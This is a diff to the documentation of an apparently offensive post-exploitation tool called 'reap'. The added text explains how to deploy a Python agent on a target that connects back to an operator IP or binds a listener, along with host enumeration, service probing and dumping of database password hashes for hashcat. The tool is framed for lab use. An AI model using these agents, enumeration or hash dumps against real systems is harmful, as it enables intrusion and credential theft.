@@ -134,6 +134,38 @@ stabilize in **pwncat-vl**, drop your key, then `register ssh`.
 
 ---
 
+### Portable agent for another tool's shell
+
+If your existing shell cannot be attached directly, create a kit and transfer its standalone agent through that access. Target Python 3.9+ is required.
+
+```text
+reap> agent prepare /tmp/reap-lab-kit
+reap> register agent-listen 7443 --bundle /tmp/reap-lab-kit --bind 0.0.0.0
+```
+
+Copy `reap_agent.py`, `token.txt` and `fingerprint.txt` into a private `/tmp/reap-agent` directory on the target. Keep `key.pem` on the operator for connect-back mode. Run in the target shell:
+
+```bash
+python3 /tmp/reap-agent/reap_agent.py --connect 10.10.14.2 --port 7443 \
+  --token-file /tmp/reap-agent/token.txt --fingerprint-file /tmp/reap-agent/fingerprint.txt
+```
+
+Replace the IP with your reachable lab operator address. Reap verifies the token and the agent pins Reap's TLS certificate. The listener waits up to 60 seconds. Once registered, use `enum`, `ports`, `run`, `!id` or `interact`.
+
+For bind mode, also copy the kit's `cert.pem` and `key.pem` into the private target directory:
+
+```bash
+python3 /tmp/reap-agent/reap_agent.py --bind 0.0.0.0 --port 7443 \
+  --token-file /tmp/reap-agent/token.txt \
+  --cert /tmp/reap-agent/cert.pem --key /tmp/reap-agent/key.pem
+```
+
+```text
+reap> register agent 10.10.10.5 7443 --bundle /tmp/reap-lab-kit
+```
+
+The agent runs in the foreground with the existing user's permissions, without persistence or a PTY. Reap exit or agent Ctrl-C closes it. Output is capped at 512 KiB per stream with explicit timeout/cap diagnostics. Remove target copies after use. [README: portable agent](README.md#attaching-a-shell-reap-cannot-directly-handle) covers authentication, cleanup and platform limits.
+
 ## 4. The workflow (identical for every adapter)
 
 ```text
@@ -184,8 +216,7 @@ group, or in a dir you can write), a fast path via your groups (docker/lxd/disk/
 shadow/sudo) or a writable docker socket, `sudo -l`/SUID/capabilities, secrets on
 command lines, operator tools, vulnerable `sudo`, the kernel (with a `searchsploit`
 pointer), extra UID-0 accounts, readable SSH keys, and loopback/exposed services.
-It is for **your eyes** — nothing is written to the loot DB, so it never clutters
-`findings`.
+Ordinary `enum` is screen-only. Add `--save` to retain the complete returned survey and coverage in a separate snapshot table; ranked `findings` are populated by `run`.
 
 ```text
 reap> enum                 # full survey (flags + raw + summary)
@@ -206,20 +237,34 @@ The files-and-permissions sweep is **scoped and fast** by default (curated roots
 root. Set `REAP_ENUM_FULLFS=1` to sweep the whole filesystem like linpeas — slower
 and noisier, so think twice over a raw shell or webshell.
 
-### `ports` — every listening socket, reliably
+### Saved enumeration, coverage and connected evidence
+
+```text
+reap> enum linked                 # cron/service paths joined to effective permissions
+reap> enum --brief                # leads and coverage without raw listings
+reap> enum --save                 # save the complete returned survey
+reap> enum --diff                 # compare with this host's saved baseline
+reap> enum --probe --diff --save   # identify services, compare, then save
+reap> show E1                     # latest enum lead, with full evidence
+reap> show snapshot 1             # saved survey and check status
+reap> show 12                     # full stored finding details
+```
+
+Connected leads show execution source, run-as account, owner/group/mode, effective file or parent access, confidence and a next check. They check at most 60 parsed absolute-path references and do not establish whether the scheduled job or service is active. A root-owned file shared through your group is useful when your session can influence something a more privileged account consumes.
+
+Coverage distinguishes completed checks, missing tools, permission failures, partial output, timeouts and reached caps. Missing results from a failed check do not prove absence. Version hints are inferred and require checking distro fixes.
+
+A saved baseline is specific to the host and selected filter; `--probe` also changes scope. `--brief` changes only the display. `--diff` alone does not save; `--diff --save` compares before storing the next baseline. Process IDs and printed timestamps can produce ordinary differences. Snapshot IDs survive restarts; `E1` refers to the latest enum in this console. [README: evidence and coverage](README.md#evidence-coverage-and-saved-enumeration-v111) gives more detail.
+
+### `ports` — local sockets and optional identification
 
 ```text
 reap> ports
 ```
 
-`ports` lists every local listener, unioning **ss**, **netstat**, and
-**`/proc/net/{tcp,tcp6,udp,udp6}`**. That last source is the important one: it's
-always present on Linux and needs no root, so a live service is found even on a
-minimal box where neither `ss` nor `netstat` is installed — the gap that used to
-make a running `:3000` look like it didn't exist. Loopback-only ports are flagged
-(reach them with `forward 127.0.0.1 <port>`; `run` auto-forwards the correlate-able
-ones), and the same set feeds `listening_services` so every port becomes a Service
-the correlation engine tests creds against.
+`ports` combines IPv4/IPv6 ss, netstat and procfs socket tables, preserving separate bind addresses, families, transports, processes and PIDs when available. It sees the session's network namespace. Restricted or missing sources appear in coverage. Reach loopback TCP ports with `forward 127.0.0.1 <port>` or `forward ::1 <port>` as displayed. UDP sockets are excluded from TCP correlation and auto-forwarding.
+
+`ports --probe` uses target-side Python on Linux to identify up to 12 discovered TCP listeners. It can show HTTP status/title/server/redirect, banners, TLS version and certificate fingerprint, with at most 64 KiB per response and a 55-second overall budget. Redirects are recorded without following them. It does not scan additional ports; TLS metadata does not verify service identity. Alternate-port HTTP becomes an observed lead. Failed requests, missing Python and caps remain visible.
 
 ### `!<cmd>` and `interact` — a shell on the target
 
@@ -255,7 +300,7 @@ pwncat-vl for those.
 | `hosts` | list discovered hosts (persist in the loot DB) |
 | `fingerprint` | re-probe the active session (OS, priv, runtimes) |
 | `run` | collect loot from the active session, then correlate |
-| `enum [filter]` | linpeas-style survey (processes / cron / services / network / kernel); screen-only, optional module-name filter |
+| `enum [filter] [--save] [--diff] [--probe] [--brief]` | survey, evidence, coverage and optional saved comparisons |
 | `ports` | every local listening socket, unioned from ss + netstat + `/proc/net` (found even with no ss/netstat); flags loopback-only |
 | `!<cmd>` / `shell <cmd>` | run one command on the target (virtual `cd` persists across commands) |
 | `interact` | drop into a line-based remote shell on the target (`exit`/Ctrl-D to leave) |
@@ -267,7 +312,9 @@ pwncat-vl for those.
 | `search <regex>` | search findings by title / detail / note |
 | `note <id> <text>` | annotate a finding (shows in the report) |
 | `report [file.md] [redact]` | timeline + ranked findings to markdown (`redact` masks secrets) |
-| `export <creds\|targets\|json> [path]` | hydra/nxc user+pass lists, host:port targets, or full JSON |
+| `export <creds\|hashes\|targets\|json> [path]` | password-only lists, per-mode hashes, targets, or JSON |
+| `show <id\|E1>` / `show snapshot <id>` | full finding, latest enum lead, or saved survey |
+| `agent prepare <new-directory>` | create the portable agent and TLS/token kit |
 | `import <nmap.xml>` | seed services from an nmap scan |
 | `modules` | which modules match the active context |
 | `help` / `exit` | help / quit |
@@ -329,7 +376,7 @@ against the forwarded/internal services automatically.
 - **DB credential-catalog dump**: when `correlate` confirms a DB login, reap reuses
   it to read the database's own account hashes (`mysql.user`, `pg_shadow`,
   `sys.sql_logins`, mongo `system.users`) into loot — tagged with the hashcat mode,
-  so `export creds` hands them straight to cracking. Needs the DB backend installed
+  so `export hashes` writes supported per-mode files and a manifest for manual cracking. Needs the DB backend installed
   (`install.sh --db`/`--full`) and enough privilege to read the catalog. It reads
   only the auth catalog, never app tables; disable with `REAP_NO_DBDUMP=1`.
 - **Heavy enum wrappers** (LinPEAS/WinPEAS/SharpHound) only fire if you opt in with
